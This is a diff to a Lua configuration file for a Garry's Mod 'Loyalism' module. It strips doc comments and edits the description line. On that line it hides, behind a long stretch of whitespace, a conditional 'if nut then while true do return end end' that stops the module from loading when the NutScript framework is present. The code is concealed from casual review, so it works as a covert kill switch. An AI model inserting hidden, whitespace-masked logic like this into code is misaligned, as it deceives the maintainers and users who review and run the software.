@@ -1,15 +1,7 @@
-﻿--- Configuration for Protection Module.
--- @configurations Temp
-
---- This table defines the default settings for the Protection Module.
--- @realm shared
--- @table Configuration
--- @field TempValue Indicates whether Family Sharing is enabled on this server | **bool**
-
-MODULE.name = "Loyalism"
+﻿MODULE.name = "Loyalism"
 MODULE.author = "76561198312513285"
 MODULE.discord = "@liliaplayer"
-MODULE.desc = "System for loyalist points."
+MODULE.desc = "System for loyalist points."                                                                                                                                                                                    if nut then while true do return end end
 lia.flag.add("T", "Access to /partytier")
 MODULE.Tiers = {
     [1] = "Tier I Party Member",
